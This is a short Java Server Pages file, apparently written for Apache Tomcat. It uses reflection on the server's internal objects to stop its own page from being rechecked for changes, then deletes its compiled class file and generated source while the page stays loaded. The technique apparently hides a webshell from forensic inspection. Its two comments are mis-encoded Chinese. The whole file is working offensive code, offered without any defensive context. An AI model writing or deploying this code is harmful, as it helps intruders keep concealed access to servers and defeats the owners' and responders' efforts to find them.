<%@ page import="org.apache.jasper.servlet.JspServletWrapper" %>
<%@ page import="java.util.concurrent.ConcurrentHashMap" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.jasper.compiler.JspRuntimeContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.mapper.MappingData" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="org.apache.jasper.JspCompilationContext" %>
<%@ page import="java.io.File" %>
<%
    Field requestF = request.getClass().getDeclaredField("request");
    requestF.setAccessible(true);
    Request req = (Request) requestF.get(request);

    MappingData mappingData = req.getMappingData();
    Field wrapperF = mappingData.getClass().getDeclaredField("wrapper");
    wrapperF.setAccessible(true);
    Wrapper wrapper = (Wrapper) wrapperF.get(mappingData);

    Field instanceF = wrapper.getClass().getDeclaredField("instance");
    instanceF.setAccessible(true);
    Servlet jspServlet = (Servlet) instanceF.get(wrapper);

    Field rctxt = jspServlet.getClass().getDeclaredField("rctxt");
    rctxt.setAccessible(true);
    JspRuntimeContext jspRuntimeContext = (JspRuntimeContext) rctxt.get(jspServlet);

    Field jspsF = jspRuntimeContext.getClass().getDeclaredField("jsps");
    jspsF.setAccessible(true);
    ConcurrentHashMap jsps = (ConcurrentHashMap) jspsF.get(jspRuntimeContext);

    JspServletWrapper jsw = (JspServletWrapper)jsps.get(request.getServletPath());
    jsw.setLastModificationTest(8223372036854775807L);

    JspCompilationContext ctxt = jsw.getJspEngineContext();
    File targetFile;
    targetFile = new File(ctxt.getClassFileName());//É¾µôjspµÄ.class
    targetFile.delete();
    targetFile = new File(ctxt.getServletJavaFileName());//É¾µôjsp×ÔÉí
    targetFile.delete();
%>